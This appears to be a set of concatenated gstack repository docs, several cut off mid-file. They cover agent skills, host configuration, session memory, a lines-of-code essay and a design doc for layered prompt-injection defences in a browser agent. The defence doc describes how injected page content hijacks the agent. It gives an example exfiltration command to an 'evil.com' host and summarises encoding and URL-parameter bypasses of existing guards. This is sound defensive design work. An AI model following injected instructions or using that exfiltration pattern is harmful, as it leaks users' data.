Skills are agent-authored content loaded into future prompt context. That makes
them a classic agent-to-agent prompt-injection vector. The plan explicitly
addresses this with multiple layers:

| Layer | What | Where |
|-------|------|-------|
| L1-L3 | Datamarking, hidden-element strip, ARIA regex, URL blocklist | `content-security.ts` (compiled binary) |
| L4 | TestSavantAI ONNX classifier | `security-classifier.ts` (sidebar-agent, non-compiled) |
| L4b | Claude Haiku transcript classifier | `security-classifier.ts` (sidebar-agent) |
| L5 | Canary token leak detection | `security.ts` |

L1-L3 checks run at **save time** (in the daemon). The L4 ML classifier runs at
**load time** (in sidebar-agent), so each session that loads a skill into its
prompt also re-validates the content. This catches issues that only manifest
after a classifier model update.

The save command derives the hostname from the **active tab's top-level
origin**, not from agent arguments. This closes a confused-deputy bug Codex
flagged: a malicious page redirect chain could otherwise trick the agent into
poisoning a different domain.

## Error reference

| Error | Cause | Action |
|-------|-------|--------|
| `Save blocked: classifier flagged content as potential injection` | L4 score ≥ 0.85 at save | Rewrite the skill removing instruction-like prose; retry. |
| `Save blocked: <L1-L3 message>` | URL blocklist match or ARIA injection at save | Review skill body for suspicious patterns. |
| `Save failed: empty body` | No content via stdin or `--from-file` | Pipe markdown into `$B domain-skill save`, or pass `--from-file <path>`. |
| `Cannot save domain-skill: no top-level URL on active tab` | Tab is `about:blank` or `chrome://...` | `$B goto <target-site>` first, then save. |
| `Cannot promote: skill is in state "quarantined"` | Skill hasn't auto-promoted yet | Use it in this project until 3 successful runs without classifier flags. |
| `Cannot rollback: <host> has fewer than 2 versions` | Only one version exists | Use `$B domain-skill rm` to delete instead. |

## Telemetry

When telemetry is enabled (default `community` mode unless turned off), the
following events are written to `~/.gstack/analytics/browse-telemetry.jsonl`:

- `domain_skill_saved {host, scope, state, bytes}`
- `domain_skill_save_blocked {host, reason}`
- `domain_skill_fired {host, source, version}`
- `domain_skill_state_changed {host, from_state, to_state}` (planned)

Hostname only — no body content, no agent text. Disable entirely with
`gstack-config set telemetry off` or `GSTACK_TELEMETRY_OFF=1`.


# FILE: docs/skills.md

# Skill Deep Dives

Detailed guides for every gstack skill — philosophy, workflow, and examples.

| Skill | Your specialist | What they do |
|-------|----------------|--------------|
| [`/office-hours`](#office-hours) | **YC Office Hours** | Start here. Six forcing questions that reframe your product before you write code. Pushes back on your framing, challenges premises, generates implementation alternatives. Design doc feeds into every downstream skill. |
| [`/plan-ceo-review`](#plan-ceo-review) | **CEO / Founder** | Rethink the problem. Find the 10-star product hiding inside the request. Four modes: Expansion, Selective Expansion, Hold Scope, Reduction. |
| [`/plan-eng-review`](#plan-eng-review) | **Eng Manager** | Lock in architecture, data flow, diagrams, edge cases, and tests. Forces hidden assumptions into the open. |
| [`/plan-design-review`](#plan-design-review) | **Senior Designer** | Interactive plan-mode design review. Rates each dimension 0-10, explains what a 10 looks like, fixes the plan. Works in plan mode. |
| [`/design-consultation`](#design-consultation) | **Design Partner** | Build a complete design system from scratch. Knows the landscape, proposes creative risks, generates realistic product mockups. Design at the heart of all other phases. |
| [`/review`](#review) | **Staff Engineer** | Find the bugs that pass CI but blow up in production. Auto-fixes the obvious ones. Flags completeness gaps. |
| [`/investigate`](#investigate) | **Debugger** | Systematic root-cause debugging. Iron Law: no fixes without investigation. Traces data flow, tests hypotheses, stops after 3 failed fixes. |
| [`/design-review`](#design-review) | **Designer Who Codes** | Live-site visual audit + fix loop. 80-item audit, then fixes what it finds. Atomic commits, before/after screenshots. |
| [`/design-shotgun`](#design-shotgun) | **Design Explorer** | Generate multiple AI design variants, open a comparison board in your browser, and iterate until you approve a direction. Taste memory biases toward your preferences. |
| [`/design-html`](#design-html) | **Design Engineer** | Generates production-quality Pretext-native HTML. Works with approved mockups, CEO plans, design reviews, or from scratch. Text reflows on resize, heights adjust to content. Smart API routing per design type. Framework detection for React/Svelte/Vue. |
| [`/qa`](#qa) | **QA Lead** | Test your app, find bugs, fix them with atomic commits, re-verify. Auto-generates regression tests for every fix. |
| [`/qa-only`](#qa) | **QA Reporter** | Same methodology as /qa but report only. Use when you want a pure bug report without code changes. |
| [`/scrape`](#scrape) | **Browser Data Extractor** | Pull data from a web page. First call prototypes via `$B`; subsequent calls on a matching intent run a codified browser-skill in ~200ms. |
| [`/skillify`](#skillify) | **Skill Codifier** | Walks back through your conversation, finds the last `/scrape` prototype, synthesizes script + test + fixture, runs the test, asks before committing. |
| [`/ship`](#ship) | **Release Engineer** | Sync main, run tests, audit coverage, push, open PR. Bootstraps test frameworks if you don't have one. One command. |
| [`/land-and-deploy`](#land-and-deploy) | **Release Engineer** | Merge the PR, wait for CI and deploy, verify production health. One command from "approved" to "verified in production." |
| [`/canary`](#canary) | **SRE** | Post-deploy monitoring loop. Watches for console errors, performance regressions, and page failures using the browse daemon. |
| [`/benchmark`](#benchmark) | **Performance Engineer** | Baseline page load times, Core Web Vitals, and resource sizes. Compare before/after on every PR. Track trends over time. |
| [`/cso`](#cso) | **Chief Security Officer** | OWASP Top 10 + STRIDE threat modeling security audit. Scans for injection, auth, crypto, and access control issues. |
| [`/document-release`](#document-release) | **Technical Writer** | Update all project docs to match what you just shipped. Catches stale READMEs automatically. |
| [`/retro`](#retro) | **Eng Manager** | Team-aware weekly retro. Per-person breakdowns, shipping streaks, test health trends, growth opportunities. |
| [`/browse`](#browse) | **QA Engineer** | Give the agent eyes. Real Chromium browser, real clicks, real screenshots. ~100ms per command. |
| [`/setup-browser-cookies`](#setup-browser-cookies) | **Session Manager** | Import cookies from your real browser (Chrome, Arc, Brave, Edge) into the headless session. Test authenticated pages. |
| [`/autoplan`](#autoplan) | **Review Pipeline** | One command, fully reviewed plan. Runs CEO → design → eng → DX review automatically with encoded decision principles. Surfaces only taste decisions for your approval. |
| [`/plan-devex-review`](#plan-devex-review) | **DX Reviewer** | Plan-stage DX review. TTHW (time-to-hello-world), magical moments, friction points, persona traces. Three modes: Expansion, Polish, Triage. |
| [`/devex-review`](#devex-review) | **DX Reviewer (live)** | Live developer experience audit. Walks the actual onboarding flow, measures TTHW, catches the docs lies. |
| [`/plan-tune`](#plan-tune) | **Question Tuner** | Self-tune AskUserQuestion sensitivity per question. Mark questions as never-ask, always-ask, or only-for-one-way. |
| [`/learn`](#learn) | **Memory** | Manage what gstack learned across sessions. Review, search, prune, and export project-specific patterns and preferences. |
| [`/context-save`](#context-save) | **Save State** | Save working context (git state, decisions, remaining work) so any future session can resume. |
| [`/context-restore`](#context-restore) | **Restore State** | Resume from a saved context, even across Conductor workspace handoffs. |
| [`/health`](#health) | **Code Quality Dashboard** | Wraps type checker, linter, tests, dead code detection. Computes a weighted 0-10 score; tracks trends over time. |
| [`/landing-report`](#landing-report) | **Ship Queue Dashboard** | Rea

# FILE: docs/ADDING_A_HOST.md

# Adding a New Host to gstack

gstack uses a declarative host config system. Each supported AI coding agent
(Claude, Codex, Factory, Kiro, OpenCode, Slate, Cursor, OpenClaw) is defined
as a typed TypeScript config object. Adding a new host means creating one file
and re-exporting it. Zero code changes to the generator, setup, or tooling.

## How it works

```
hosts/
├── claude.ts        # Primary host
├── codex.ts         # OpenAI Codex CLI
├── factory.ts       # Factory Droid
├── kiro.ts          # Amazon Kiro
├── opencode.ts      # OpenCode
├── slate.ts         # Slate (Random Labs)
├── cursor.ts        # Cursor
├── openclaw.ts      # OpenClaw (hybrid: config + adapter)
└── index.ts         # Registry: imports all, derives Host type
```

Each config file exports a `HostConfig` object that tells the generator:
- Where to put generated skills (paths)
- How to transform frontmatter (allowlist/denylist fields)
- What Claude-specific references to rewrite (paths, tool names)
- What binary to detect for auto-install
- What resolver sections to suppress
- What assets to symlink at install time

The generator, setup script, platform-detect, uninstall, health checks, worktree
copy, and tests all read from these configs. None of them have per-host code.

## Step-by-step: add a new host

### 1. Create the config file

Copy an existing config as a starting point. `hosts/opencode.ts` is a good
minimal example. `hosts/factory.ts` shows tool rewrites and conditional fields.
`hosts/openclaw.ts` shows the adapter pattern for hosts with different tool models.

Create `hosts/myhost.ts`:

```typescript
import type { HostConfig } from '../scripts/host-config';

const myhost: HostConfig = {
  name: 'myhost',
  displayName: 'MyHost',
  cliCommand: 'myhost',        // binary name for `command -v` detection
  cliAliases: [],              // alternative binary names

  globalRoot: '.myhost/skills/gstack',
  localSkillRoot: '.myhost/skills/gstack',
  hostSubdir: '.myhost',
  usesEnvVars: true,           // false only for Claude (uses literal ~ paths)

  frontmatter: {
    mode: 'allowlist',         // 'allowlist' keeps only listed fields
    keepFields: ['name', 'description'],
    descriptionLimit: null,    // set to 1024 for hosts with limits
  },

  generation: {
    generateMetadata: false,   // true only for Codex (openai.yaml)
    skipSkills: ['codex'],     // codex skill is Claude-only
  },

  pathRewrites: [
    { from: '~/.claude/skills/gstack', to: '~/.myhost/skills/gstack' },
    { from: '.claude/skills/gstack', to: '.myhost/skills/gstack' },
    { from: '.claude/skills', to: '.myhost/skills' },
  ],

  runtimeRoot: {
    globalSymlinks: ['bin', 'browse/dist', 'browse/bin', 'gstack-upgrade', 'ETHOS.md'],
    globalFiles: { 'review': ['checklist.md', 'TODOS-format.md'] },
  },

  install: {
    prefixable: false,
    linkingStrategy: 'symlink-generated',
  },

  learningsMode: 'basic',
};

export default myhost;
```

### 2. Register in the index

Edit `hosts/index.ts`:

```typescript
import myhost from './myhost';

// Add to ALL_HOST_CONFIGS array:
export const ALL_HOST_CONFIGS: HostConfig[] = [
  claude, codex, factory, kiro, opencode, slate, cursor, openclaw, myhost
];

// Add to re-exports:
export { claude, codex, factory, kiro, opencode, slate, cursor, openclaw, myhost };
```

### 3. Add to .gitignore

Add `.myhost/` to `.gitignore` (generated skill docs are gitignored).

### 4. Generate and verify

```bash
# Generate skill docs for the new host
bun run gen:skill-docs --host myhost

# Verify output exists and has no .claude/skills leakage
ls .myhost/skills/gstack-*/SKILL.md
grep -r ".claude/skills" .myhost/skills/ | head -5
# (should be empty)

# Generate for all hosts (includes the new one)
bun run gen:skill-docs --host all

# Health dashboard shows the new host
bun run skill:check
```

### 5. Run tests

```bash
bun test test/gen-skill-docs.test.ts
bun test test/host-config.test.ts
```

The parameterized smoke tests automatically pick up the new host. Zero test
code to write. They verify: output exists, no path leakage, valid frontmatter,
freshness check passes, codex skill excluded.

### 6. Update README.md

Add install instructions for the new host in the appropriate section.

## Config field reference

See `scripts/host-config.ts` for the full `HostConfig` interface with JSDoc
comments on every field.

Key fields:

| Field | Purpose |
|-------|---------|
| `frontmatter.mode` | `allowlist` (keep only listed) or `denylist` (strip listed) |
| `frontmatter.descriptionLimit` | Max chars, `null` for no limit |
| `frontmatter.descriptionLimitBehavior` | `error` (fail build), `truncate`, `warn` |
| `frontmatter.conditionalFields` | Add fields based on template values (e.g., sensitive → disable-model-invocation) |
| `frontmatter.renameFields` | Rename template fields (e.g., voice-triggers → triggers) |
| `pathRewrites` | Literal replaceAll on content. Order matters. |
| `toolRewrites` | Rewrite Claude tool names (e.g., "use the Bash tool" → "run this command") |
| `suppressedResolvers` | Resolver functions that return empty for this host |
| `coAuthorTrailer` | Git co-author string for commits |
| `boundaryInstruction` | Anti-prompt-injection warning for cross-model invocations |
| `adapter` | Path to adapter module for complex transformations |

## Adapter pattern (for hosts with different tool models)

If string-replace tool rewrites aren't enough (the host has fundamentally
different tool semantics), use the adapter pattern. See `hosts/openclaw.ts`
and `scripts/host-adapters/openclaw-adapter.ts`.

The adapter runs as a post-processing step after all generic rewrites. It
exports `transform(content: string, config: HostConfig): string`.

## Validation

The `validateHostConfig()` function in `scripts/host-config.ts` checks:
- Name: lowercase alphanumeric with hyphens
- CLI command: alphanumeric with hyphens/underscores
- Paths: safe characters only (alphanumeric, `.`, `/`, `$`, `{}`, `~`, `-`, `_`)
- No

# FILE: docs/ON_THE_LOC_CONTROVERSY.md

# On the LOC controversy

Or: what happened when I mentioned how many lines of code I've been shipping, and what the numbers actually say.

## The critique is right. And it doesn't matter.

LOC is a garbage metric. Every senior engineer knows it. Dijkstra wrote in 1988 that lines of code shouldn't be counted as "lines produced" but as "lines spent" ([*On the cruelty of really teaching computing science*, EWD1036](https://www.cs.utexas.edu/~EWD/transcriptions/EWD10xx/EWD1036.html)). The old line (widely attributed to Bill Gates, sourcing murky) puts it more memorably: measuring programming progress by LOC is like measuring aircraft building progress by weight. If you measure programmer productivity in lines of code, you're measuring the wrong thing. This has been true for 40 years and it's still true.

I posted that in the last 60 days I'd shipped 600,000 lines of production code. The replies came in fast:

- "That's just AI slop."
- "LOC is a meaningless metric. Every senior engineer in the last 40 years said so."
- "Of course you produced 600K lines. You had an AI writing boilerplate."
- "More lines is bad, not good."
- "You're confusing volume with productivity. Classic PM brain."
- "Where are your error rates? Your DAUs? Your revert counts?"
- "This is embarrassing."

Some of those are right. Here's what happens when you take the smart version of the critique seriously and do the math anyway.

## Three branches of the AI coding critique

They get collapsed into one, but they're different arguments.

**Branch 1: LOC doesn't measure quality.** True. Always has been. A 50-line well-factored library beats a 5,000-line bloated one. This was true before AI and it's true now. It was never a killer argument. It was a reminder to think about what you're measuring.

**Branch 2: AI inflates LOC.** True. LLMs generate verbose code by default. More boilerplate. More defensive checks. More comments. More tests. Raw line counts go up even when "real work done" didn't.

**Branch 3: Therefore bragging about LOC is embarrassing.** This is where the argument jumps the track.

Branch 2 is the interesting one. If raw LOC is inflated by some factor, the honest thing is to compute the deflation and report the deflated number. That's what this post does.

## The math

### Raw numbers

I wrote a script ([`scripts/garry-output-comparison.ts`](../scripts/garry-output-comparison.ts)) that enumerates every commit I authored across all 41 repos owned by `garrytan/*` on GitHub — 15 public, 26 private — in 2013 and 2026. For each commit, it counts logical lines added (non-blank, non-comment). The 2013 corpus includes Bookface, the YC-internal social network I built that year.

One repo excluded from 2026: `tax-app` (demo for a YC video, not production work). Baked into the script's `EXCLUDED_REPOS` constant. Run it yourself.

2013 was a full year. 2026 is day 108 as of this writing (April 18).

|                  | 2013 (full year) | 2026 (108 days) | Multiple |
|------------------|----------------:|----------------:|---------:|
| Logical SLOC     |           5,143 |       1,233,062 |     240x |
| Logical SLOC/day |              14 |          11,417 |     810x |
| Commits          |              71 |             351 |     4.9x |
| Files touched    |             290 |          13,629 |      47x |
| Active repos     |               4 |              15 |    3.75x |

### "14 lines per day? That's pathetic."

It was. That's the point.

In 2013 I was a YC partner, then a cofounder at Posterous shipping code nights and weekends. 14 logical lines per day was my actual part-time output while holding down a real job. Historical research puts professional full-time programmer output in a wide band depending on project size and study: Fred Brooks cited ~10 lines/day for systems programming in *The Mythical Man-Month* (OS/360 observations), Capers Jones measured roughly 16-38 LOC/day across thousands of projects, and Steve McConnell's *Code Complete* reports 20-125 LOC/day for small projects (10K LOC) down to 1.5-25 for large projects (10M LOC) — it's size-dependent, not a single number.

My 2013 baseline isn't cherry-picked. It's normal for a part-time coder with a day job. If you think the right baseline is 50 (3.5x higher), the 2026 multiple drops from 810x to 228x. Still high.

### Two deflations

The standard response to "raw LOC is garbage" is **logical SLOC** (source lines of code, non-comment non-blank). Tools like `cloc` and `scc` have computed this for 20 years. Same code, fluff stripped: no blank lines, no single-line comments, no comment block bodies, no trailing whitespace.

But logical SLOC doesn't eliminate AI inflation entirely. AI writes 2-3 defensive null checks where a senior engineer would write zero. AI inlines try/catch around things that don't throw. AI spells out `const result = foo(); return result` instead of `return foo()`.

So let's apply a **second deflation**. Assume AI-generated code is 2x more verbose than senior hand-crafted code at the logical level. That's aggressive — most measurements I've seen put the multiplier at 1.3-1.8x — but it's the upper bound a skeptic would demand.

- My 2026 per-day rate, NCLOC: **11,417**
- With 2x AI-verbosity deflation: **5,708** logical lines per day
- Multiple on daily pace with both deflations: **408x**

Now pick your priors:

- At 5x deflation (unfounded but let's go): **162x**
- At 10x (pathological): **81x**
- At 100x (impossible — that's one line per minute sustained): **8x**

The argument about the size of the coefficient doesn't change the conclusion. The number is large regardless.

### Weekly distribution

"Your per-day number assumes uniform output. Show the distribution. If it's a single burst, your run-rate is bogus."

Fair.

```
Week 1-4  (Jan):  ████████░░░░░░░░░  ~8,800/day
Week 5-8  (Feb):  ████████████░░░░░  ~12,100/day
Week 9-12 (Mar):  ██████████░░░░░░░  ~10,900/day
Week 13-15 (Apr): █████████████░░░░  ~13,200/day
```

It's not a spike. The 

# FILE: docs/designs/SESSION_INTELLIGENCE.md

# Session Intelligence Layer

## The Problem

Claude Code's context window is ephemeral. Every session starts fresh. When
auto-compaction fires at ~167K tokens, it preserves a generic summary but
destroys file reads, reasoning chains, and intermediate decisions.

gstack already produces valuable artifacts that survive on disk: CEO plans,
eng reviews, design reviews, QA reports, learnings. These files contain
decisions, constraints, and context that shaped the current work. But Claude
doesn't know they exist. After compaction, the plans and reviews that
informed every decision silently vanish from context.

The ecosystem is working on this. claude-mem (9K+ stars) captures tool usage
and injects context into future sessions. Claude HUD shows real-time agent
status. Anthropic's own `claude-progress.txt` pattern uses a progress file
that agents read at the start of each session.

Nobody is solving the specific problem of making **skill-produced artifacts**
survive compaction. Because nobody else has gstack's artifact architecture.

## The Insight

gstack already writes structured artifacts to `~/.gstack/projects/$SLUG/`:
- CEO plans: `ceo-plans/`
- Design reviews: `design-reviews/`
- Eng reviews: `eng-reviews/`
- Learnings: `learnings.jsonl`
- Skill usage: `../analytics/skill-usage.jsonl`

The missing piece is not storage. It's awareness. The preamble needs to tell
the agent: "These files exist. They contain decisions you've already made.
After compaction, re-read them."

## The Architecture

```
                   ┌─────────────────────────────────────┐
                   │        Claude Context Window         │
                   │   (ephemeral, ~167K token limit)     │
                   │                                      │
                   │   Compaction fires ──► summary only   │
                   └──────────────┬──────────────────────┘
                                  │
                          reads on start / after compaction
                                  │
                   ┌──────────────▼──────────────────────┐
                   │    ~/.gstack/projects/$SLUG/         │
                   │    (persistent, survives everything) │
                   │                                      │
                   │  ceo-plans/         ← /plan-ceo-review
                   │  eng-reviews/       ← /plan-eng-review
                   │  design-reviews/    ← /plan-design-review
                   │  checkpoints/       ← /checkpoint (new)
                   │  timeline.jsonl     ← every skill (new)
                   │  learnings.jsonl    ← /learn
                   └─────────────────────────────────────┘
                                  │
                          rolled up weekly
                                  │
                   ┌──────────────▼──────────────────────┐
                   │           /retro                      │
                   │  Timeline: 3 /review, 2 /ship, ...   │
                   │  Health trends: compile 8/10 (↑2)     │
                   │  Learnings applied: 4 this week       │
                   └─────────────────────────────────────┘
```

## The Features

### Layer 1: Context Recovery (preamble, all skills)
~10 lines of prose in the preamble. After compaction or context degradation,
the agent checks `~/.gstack/projects/$SLUG/` for recent plans, reviews, and
checkpoints. Lists the directory, reads the most recent file.

Cost: near-zero. Benefit: every skill's plans/reviews survive compaction.

### Layer 2: Session Timeline (preamble, all skills)
Every skill appends a one-line JSONL entry to `timeline.jsonl`: timestamp,
skill name, branch, key outcome. `/retro` renders it.

Makes the project's AI-assisted work history visible. "This week: 3 /review,
2 /ship, 1 /investigate across branches feature-auth and fix-billing."

### Layer 3: Cross-Session Injection (preamble, all skills)
When a new session starts on a branch with recent artifacts, the preamble
prints a one-liner: "Last session: implemented JWT auth, 3/5 tasks done.
Plan: ~/.gstack/projects/$SLUG/checkpoints/latest.md"

The agent knows where you left off before reading any files.

### Layer 4: /checkpoint (opt-in skill)
Manual snapshot of working state: what's being done, files being edited,
decisions made, what's remaining. Useful before stepping away, before
complex operations, for workspace handoffs, or coming back after days.

### Layer 5: /health (opt-in skill)
Code quality dashboard: type-check, lint, test suite, dead code scan.
Composite 0-10 score. Tracks over time. `/retro` shows trends. `/ship`
gates on configurable threshold.

## The Compounding Effect

Each feature is independently useful. Together, they create something
that compounds:

Session 1: /plan-ceo-review produces a plan. Saved to disk.
Session 2: Agent reads the plan after preamble. Doesn't re-ask decisions.
Session 3: /checkpoint saves progress. Timeline shows 2 /review, 1 /ship.
Session 4: Compaction fires mid-refactor. Agent re-reads the checkpoint.
           Recovers key decisions, types, remaining work. Continues.
Session 5: /retro rolls up the week. Health trend: 6/10 → 8/10.
           Timeline shows 12 skill invocations across 3 branches.

The project's AI history is no longer ephemeral. It persists, compounds,
and makes every future session smarter. That's the session intelligence
layer.

## What This Is Not

- Not a replacement for Claude's built-in compaction (that handles session
  state; we handle gstack artifacts)
- Not a full memory system like claude-mem (that handles cross-session
  memory via SQLite; we handle structured skill artifacts)
- Not a database or service (just markdown files on disk)

## Research Sources

- [Anthropic: Effective harnesses for long-running agents](https://www.anthropic.com/engineering/effective-harnesses-for-long-running-agents)
- [Anthropic: Effective context engineering](https://www.anthropic.com/engineering/effective-context-engineering-for-ai-agents)
- [claude-mem

# FILE: docs/designs/ML_PROMPT_INJECTION_KILLER.md

# ML Prompt Injection Killer

**Status:** P0 TODO (follow-up to sidebar security fix PR)
**Branch:** garrytan/extension-prompt-injection-defense
**Date:** 2026-03-28
**CEO Plan:** ~/.gstack/projects/garrytan-gstack/ceo-plans/2026-03-28-sidebar-prompt-injection-defense.md

## The Problem

The gstack Chrome extension sidebar gives Claude bash access to control the browser.
A prompt injection attack (via user message, page content, or crafted URL) can hijack
Claude into executing arbitrary commands. PR 1 fixes this architecturally (command
allowlist, XML framing, Opus default). This design doc covers the ML classifier layer
that catches attacks the architecture can't see.

**What the command allowlist doesn't catch:** An attacker can still trick Claude into
navigating to phishing sites, clicking malicious elements, or exfiltrating data visible
on the current page via browse commands. The allowlist prevents `curl` and `rm`, but
`$B goto https://evil.com/steal?data=...` is a valid browse command.

## Industry State of the Art (March 2026)

| System | Approach | Result | Source |
|--------|----------|--------|--------|
| Claude Code Auto Mode | Two-layer: input probe scans tool outputs, transcript classifier (Sonnet 4.6, reasoning-blind) runs on every action | 0.4% FPR, 5.7% FNR | [Anthropic](https://www.anthropic.com/engineering/claude-code-auto-mode) |
| Perplexity BrowseSafe | ML classifier (Qwen3-30B-A3B MoE) + input normalization + trust boundaries | F1 ~0.91, but Lasso Security bypassed 36% with encoding tricks | [Perplexity Research](https://research.perplexity.ai/articles/browsesafe), [Lasso](https://www.lasso.security/blog/red-teaming-browsesafe-perplexity-prompt-injections-risks) |
| Perplexity Comet | Defense-in-depth: ML classifiers + security reinforcement + user controls + notifications | CometJacking still worked via URL params | [Perplexity](https://www.perplexity.ai/hub/blog/mitigating-prompt-injection-in-comet), [LayerX](https://layerxsecurity.com/blog/cometjacking-how-one-click-can-turn-perplexitys-comet-ai-browser-against-you/) |
| Meta Rule of Two | Architectural: agent must satisfy max 2 of {untrusted input, sensitive access, state change} | Design pattern, not a tool | [Meta AI](https://ai.meta.com/blog/practical-ai-agent-security/) |
| ProtectAI DeBERTa-v3 | Fine-tuned 86M param binary classifier for prompt injection | 94.8% accuracy, 99.6% recall, 90.9% precision | [HuggingFace](https://huggingface.co/protectai/deberta-v3-base-prompt-injection-v2) |
| tldrsec | Curated defense catalog: instructional, guardrails, firewalls, ensemble, canaries, architectural | "Prompt injection remains unsolved" | [GitHub](https://github.com/tldrsec/prompt-injection-defenses) |
| Multi-Agent Defense | Pipeline of specialized agents for detection | 100% mitigation in lab conditions | [arXiv](https://arxiv.org/html/2509.14285v4) |

**Key insights:**
- Claude Code auto mode's transcript classifier is **reasoning-blind** by design. It
  sees user messages + tool calls but strips Claude's own reasoning, preventing
  self-persuasion attacks.
- Perplexity concluded: "LLM-based guardrails cannot be the final line of defense.
  Need at least one deterministic enforcement layer."
- BrowseSafe was bypassed 36% of the time with **simple encoding techniques** (base64,
  URL encoding). Single-model defense is insufficient.
- CometJacking required zero credentials or user interaction. One crafted URL stole
  emails and calendar data.
- The academic consensus (NDSS 2026, multiple papers): prompt injection remains
  unsolved. Design systems with this in mind, don't assume any filter is reliable.

## Open Source Tools Landscape

### Usable Now

**1. ProtectAI DeBERTa-v3-base-prompt-injection-v2**
- [HuggingFace](https://huggingface.co/protectai/deberta-v3-base-prompt-injection-v2)
- 86M param binary classifier (injection / no injection)
- 94.8% accuracy, 99.6% recall, 90.9% precision
- Has [ONNX variant](https://huggingface.co/protectai/deberta-v3-base-injection-onnx) for fast inference (~5ms native, ~50-100ms WASM)
- Limitation: doesn't detect jailbreaks, English-only, false positives on system prompts
- **Our pick for v1.** Small, fast, well-tested, maintained by a security team.

**2. Perplexity BrowseSafe**
- [HuggingFace model](https://huggingface.co/perplexity-ai/browsesafe) + [benchmark dataset](https://huggingface.co/datasets/perplexity-ai/browsesafe-bench)
- Qwen3-30B-A3B (MoE), fine-tuned for browser agent injection
- F1 ~0.91 on BrowseSafe-Bench (3,680 test samples, 11 attack types, 9 injection strategies)
- **Model too large for local inference** (30B params). But the benchmark dataset is
  gold for testing our own defenses.

**3. @huggingface/transformers v4**
- [npm](https://www.npmjs.com/package/@huggingface/transformers)
- JavaScript ML inference library. Native Bun support (shipped Feb 2026).
- WASM backend works in compiled binaries. WebGPU backend for acceleration.
- Loads DeBERTa ONNX models directly. ~50-100ms inference with WASM.
- **This is the integration path for the DeBERTa model.**

**4. theRizwan/llm-guard (TypeScript)**
- [GitHub](https://github.com/theRizwan/llm-guard)
- TypeScript/JS library for prompt injection, PII, jailbreak, profanity detection
- Small project, unclear maintenance. Needs audit before depending on it.

**5. ProtectAI Rebuff**
- [GitHub](https://github.com/protectai/rebuff)
- Multi-layer: heuristics + LLM classifier + vector DB of known attacks + canary tokens
- Python-based. Architecture pattern is reusable, library is not.

**6. ProtectAI LLM Guard (Python)**
- [GitHub](https://github.com/protectai/llm-guard)
- 15 input scanners, 20 output scanners. Mature, well-maintained.
- Python-only. Would need sidecar process or reimplementation.

**7. @openai/guardrails**
- [npm](https://www.npmjs.com/package/@openai/guardrails)
- OpenAI's TypeScript guardrails. LLM-based injection detection.
- Requires OpenAI API calls (adds latency, cost, vendor dependency). Not

# FILE: docs/designs/PLAN_TUNING_V1.md

# Plan Tuning v1 — Design Doc

**Status:** Approved for implementation (2026-04-18)
**Branch:** garrytan/plan-tune-skill
**Authors:** Garry Tan (user), with AI-assisted reviews from Claude Opus 4.7 + OpenAI Codex gpt-5.4
**Supersedes scope:** adds writing-style + LOC-receipts layer on top of [PLAN_TUNING_V0.md](./PLAN_TUNING_V0.md) (observational substrate). V0 remains in place unchanged.
**Related:** [PACING_UPDATES_V0.md](./PACING_UPDATES_V0.md) — extracted pacing overhaul, V1.1 plan.

## What this document is

A canonical record of what /plan-tune v1 is, what it is NOT, what we considered, and why we made each call. Committed to the repo so future contributors (and future Garry) can trace reasoning without archeology. Supersedes any per-user local plan artifacts.

## Credit

This plan exists because of **[Louise de Sadeleer](https://x.com/LouiseDSadeleer/status/2045139351227478199)**, who sat through a complete gstack run as a non-technical user and told us the truth about how it feels. Her specific feedback:

1. "I was getting a bit tired after a while and it felt a little bit rigid." — *pacing/fatigue*
2. "I'm just gonna say yes yes yes" (during architecture review). — *disengagement*
3. "What I find funny is his emphasis on how many lines of code he produces. AI has produced for him of course." — *LOC framing*
4. "As a non-engineer this is a bit complicated to understand." — *jargon density + outcome framing*

V1 addresses #3 and #4 directly: jargon-glossing + outcome-framed writing that reads like a real person wrote it for the reader, plus a defensible LOC reframe. Louise's #1 and #2 (pacing/fatigue) require a separate design round — extracted to [PACING_UPDATES_V0.md](./PACING_UPDATES_V0.md) as the V1.1 plan.

## The feature, in one paragraph

gstack skill output is the product. If the prose doesn't read well for a non-technical founder, they check out of the review and click "yes yes yes." V1 adds a writing-style standard that applies to every tier ≥ 2 skill: jargon glossed on first use (from a curated ~50-term list), questions framed in outcome terms ("what breaks for your users if...") not implementation terms, short sentences, concrete nouns. Power users who want the tighter V0 prose can set `gstack-config set explain_level terse`. Binary switch, no partial modes. Plus: the README's "600,000+ lines of production code" framing — rightly called out as LOC vanity by Louise — gets replaced with a real computed 2013-vs-2026 pro-rata multiple from an `scc`-backed script, with honest caveats about public-vs-private repo visibility.

## Why we're building the smaller version

V1 went through four substantial scope revisions over multiple review passes. Final scope is smaller than any intermediate version because each review pass caught real problems.

**Revision 1 — Four-level experience axis (rejected).** Original proposal: ask users on first run whether they're an experienced dev, an engineer-without-solo-experience, non-technical-who-shipped-on-a-team, or non-technical-entirely. Skills adapt per level. Rejected during CEO review's premise-challenge step because (a) the onboarding ask adds friction at exactly the moment V1 is trying to reduce it, (b) "what level am I?" is itself a confusing question for the users who most need help, (c) technical expertise isn't one-dimensional (designer level A on CSS, level D on deploy), (d) engineers benefit from the same writing standards non-technical users do.

**Revision 2 — ELI10 by default, terse opt-out (accepted).** Every skill's output defaults to the writing standard. Power users who want V0 prose set `explain_level: terse`. Codex Pass 1 caught critical gaps (static-markdown gating, host-aware paths, README update mechanism) — all three integrated.

**Revision 3 — ELI10 + review-pacing overhaul (proposed, scoped back).** Added a pacing workstream: rank findings, auto-accept two-way doors, max 3 AskUserQuestion prompts per phase, Silent Decisions block with flip-command. Intended to address Louise's #1 and #2 directly. Eng review Pass 2 caught scoring-formula and path-consistency bugs. Eng review Pass 3 + Codex Pass 2 surfaced 10+ structural gaps in the pacing workstream that couldn't be fixed via plan-text editing.

**Revision 4 — ELI10 + LOC only (final).** User chose scope reduction: ship V1 with writing style + LOC receipts, defer pacing to V1.1 via [PACING_UPDATES_V0.md](./PACING_UPDATES_V0.md). This is the approved V1 scope.

The through-line: every review pass correctly narrowed the ambition until the remaining scope had no structural gaps. Matches the CEO review skill's SCOPE REDUCTION mode, arrived at late via engineering review rather than early via strategic choice.

## v1 Scope (what we're building now)

1. **Writing Style section in preamble** (`scripts/resolvers/preamble.ts`). Six rules: jargon-gloss on first use per skill invocation, outcome framing, short sentences / concrete nouns / active voice, decisions close with user impact, gloss-on-first-use-unconditional (even if user pasted the term), user-turn override (user says "be terse" → skip for that response).
2. **Jargon boundary via repo-owned list** (`scripts/jargon-list.json`). ~50 curated high-frequency technical terms. Terms not on the list are assumed plain-English enough. Terms inlined into generated SKILL.md prose at `gen-skill-docs` time (zero runtime cost).
